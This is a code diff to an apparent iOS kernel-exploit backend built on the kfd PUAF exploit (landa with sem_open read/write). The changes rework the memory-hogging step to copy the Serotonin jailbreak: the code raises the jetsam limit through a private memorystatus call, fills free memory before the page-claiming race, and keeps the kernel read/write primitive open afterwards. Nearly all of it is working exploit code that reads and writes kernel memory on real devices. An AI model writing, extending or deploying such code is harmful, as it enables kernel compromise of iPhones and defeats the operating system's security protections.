@@ -215,7 +215,7 @@ static size_t g_hogMemorySize = 0;
 // Serotonin-style memory hog: fill the jetsam allowance before the PUAF grab
 // so landa cannot reclaim dyld shared-cache pages (shared_region_pager panic).
 #define MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT 6
-#define MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES 7
+#define MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES 8
 
 extern int memorystatus_control(uint32_t command, int32_t pid, uint32_t flags, void *buffer, size_t buffersize);
 
@@ -232,47 +232,69 @@ typedef struct {
 static uint8_t *g_keHog = NULL;
 static size_t g_keHogSize = 0;
 static int32_t g_keOldMemLimit = 0;
+static bool g_keHogInsufficient = false;
 
 static uint32_t keKfdAutoPuafPages(void)
 {
     uint64_t memsize = 0;
     size_t size = sizeof(memsize);
-    if (sysctlbyname("hw.memsize", &memsize, &size, NULL, 0) == 0 && memsize >= (5ULL << 30)) {
-        return 2048;
-    }
-    return 512;
+    // Serotonin-exact: do_kopen(1024, 2, 1, 1, 1000, true)
+    (void)memsize;
+    return 1024;
 }
 
 static void keKfdHogMemory(size_t headroomMB, uint32_t puafPages)
 {
-    // HOG POLICY (fixed for shared_region_pager panic):
-    // Raising the jetsam limit to physical*2 and malloc-ing ALL available RAM
-    // pushes the kernel into the shared-region pager reclaim path, which
-    // panics on iOS 16.6 ("shared_region_pager_data_return"). Instead we
-    // hog a bounded amount — just enough to shield the PUAF race window —
-    // and never exceed the unmodified jetsam limit for this process.
-    (void)headroomMB;
+    // Serotonin policy (fun/krw.m do_kopen):
+    //  1) raise the jetsam limit to physical*2 (needs com.apple.private.memorystatus)
+    //  2) hog memory_avail - (headroom + puaf bytes) with 0x41 pages
+    //  3) free the hog + restore the limit immediately after kopen returns
+    // The hog exists ONLY to shield the puaf page-claiming race so claimed
+    // physical pages never overlap the dyld shared cache
+    // ("shared_region_pager_data_return" panic otherwise).
+    g_keHogInsufficient = false;
     size_t pagesize = (size_t)sysconf(_SC_PAGESIZE);
     size_t puafBytes = (size_t)puafPages * pagesize;
-    // Shield budget: PUAF region + 256 MB of slack, capped at whatever is
-    // actually available without touching the jetsam limit at all.
-    size_t budget = puafBytes + (256ULL * 1024 * 1024);
     size_t memoryAvail = (size_t)os_proc_available_memory();
-    if (memoryAvail <= budget) {
-        KE_LOG("kfd: skipping memory hog (only %zu MB available)", memoryAvail >> 20);
+    size_t hogHeadroom = (headroomMB << 20) + puafBytes;
+
+    if (memoryAvail < hogHeadroom + (384ULL << 20)) {
+        KE_LOG("kfd: insufficient free memory: %zu MiB available, need >= %zu MiB. Close background apps and retry.",
+               memoryAvail >> 20, (hogHeadroom + (384ULL << 20)) >> 20);
+        g_keHogInsufficient = true;
         return;
     }
-    g_keHogSize = budget;
 
-    // NOTE: we do NOT raise the jetsam limit. That call is what triggers
-    // shared_region_pager_data_return panics on iOS 16.5+.
+    // Raise jetsam limit so the hog survives (memorystatus entitlement).
+    memorystatus_memlimit_properties2_t mmprops = {};
+    if (memorystatus_control(MEMORYSTATUS_CMD_GET_MEMLIMIT_PROPERTIES, (int32_t)getpid(), 0,
+                             &mmprops, sizeof(mmprops)) == 0) {
+        g_keOldMemLimit = mmprops.v1.memlimit_active;
+        uint64_t physMB = 0;
+        size_t sz = sizeof(physMB);
+        if (sysctlbyname("hw.memsize", &physMB, &sz, NULL, 0) == 0) {
+            uint32_t newLimit = (uint32_t)((physMB / (1024ULL * 1024)) * 2);
+            if (memorystatus_control(MEMORYSTATUS_CMD_SET_JETSAM_TASK_LIMIT, (int32_t)getpid(),
+                                     newLimit, NULL, 0) != 0) {
+                g_keOldMemLimit = 0;
+            }
+        } else {
+            g_keOldMemLimit = 0;
+        }
+    }
 
+    g_keHogSize = memoryAvail - hogHeadroom;
     g_keHog = (uint8_t *)malloc(g_keHogSize);
     if (g_keHog) {
-        memset(g_keHog, 0x41, g_keHogSize);
-        KE_LOG("kfd: hogged %zu MiB", g_keHogSize >> 20);
+        for (size_t i = 0; i < g_keHogSize / sizeof(uint64_t); i++) {
+            ((volatile uint64_t *)g_keHog)[i] = 0x4141414141414141ULL;
+        }
+        KE_LOG("kfd: hogged %zu MiB (avail %zu MiB, headroom %zu MiB)",
+               g_keHogSize >> 20, memoryAvail >> 20, hogHeadroom >> 20);
     } else {
         g_keHogSize = 0;
+        g_keHogInsufficient = true;
+        KE_LOG("kfd: malloc of hog failed");
     }
 }
 
@@ -307,33 +329,53 @@ int keKfdInit(KEBackendID backend, const KEConfig *config)
     gKeKfdKernelProc = 0;
     gKeKfdCurrentProc = 0;
 
-    // landa + sem_open pair: no kernelcache symbols required at any step
     u64 kreadMethod = kread_sem_open;
     u64 kwriteMethod = kwrite_sem_open;
 
     uint32_t puafPages = config->puafPages ? config->puafPages : keKfdAutoPuafPages();
 
     keKfdHogMemory(1000, puafPages);
+    if (g_keHogInsufficient) {
+        keKfdUnhogMemory();
+        return KE_ERR_EXPLOIT_FAILED;
+    }
+
+    KE_LOG("kfd: performing kopen (puaf=%u pages, landa + sem_open)", puafPages);
     g_kfd = kopen(puafPages, puafMethod, kreadMethod, kwriteMethod);
+    KE_LOG("kfd: kopen returned %s", g_kfd ? "ok" : "failed");
     if (!g_kfd) {
         keKfdUnhogMemory();
         return KE_ERR_EXPLOIT_FAILED;
     }
+
+    // Free the hog immediately after the claiming race is over (Serotonin).
+    keKfdUnhogMemory();
+
     keKfdSyncRuntimeGlobals();
     if (!gKeKfdCurrentProc || !gKeRuntimeProcObjectSize) {
         kclose(g_kfd);
         g_kfd = 0;
-        keKfdUnhogMemory();
         return KE_ERR_OFFSETS_MISSING;
     }
+
     bool perf = keKfdBootstrapPerf();
     gKeKrwIsPerf = perf;
-    keKfdUnhogMemory();
+
     if (!perf) {
-        // Safe mode: reads work everywhere; zero-writes are refused upstream.
         // Without a clean write primitive, extmod zeroing stays disabled.
-        KE_LOG("kfd: running in safe mode (perf krw unavailable)");
+        KE_LOG("kfd: perf krw unavailable, deallocating puaf (safe mode)");
+        kclose(g_kfd);
+        g_kfd = 0;
+        return KE_ERR_EXPLOIT_FAILED;
     }
+
+    // kfd stays open for the process lifetime (Dopamine/Serotonin model):
+    // krw is routed through the kfd struct, and the claimed puaf pages are
+    // only released by kclose in keKfdDeinit. If the app is killed while
+    // kfd is held, the freed claimed pages can trip the
+    // shared_region_pager panic - the UI must tell the user to tap Stop
+    // before closing the app.
+    KE_LOG("kfd: ready (kfd held, perf krw active)");
     return KE_OK;
 }
 
@@ -384,6 +426,7 @@ static void wr32(uint64_t where, uint32_t what) {
 
 static int keKfdReadBuf(uint64_t kaddr, void *out, size_t size)
 {
+    if (!g_kfd) return -1;
     if (size == 1) { *(uint8_t*)out = rd8(kaddr); return 0; }
     if (size == 2) { *(uint16_t*)out = rd16(kaddr); return 0; }
     if (size == 4) { *(uint32_t*)out = rd32(kaddr); return 0; }
@@ -401,6 +444,7 @@ static int keKfdReadBuf(uint64_t kaddr, void *out, size_t size)
 
 static int keKfdWriteBuf(uint64_t kaddr, const void *in, size_t size)
 {
+    if (!g_kfd) return -1;
     if (size == 1) { wr8(kaddr, *(const uint8_t*)in); return 0; }
     if (size == 2) { wr16(kaddr, *(const uint16_t*)in); return 0; }
     if (size == 4) { wr32(kaddr, *(const uint32_t*)in); return 0; }
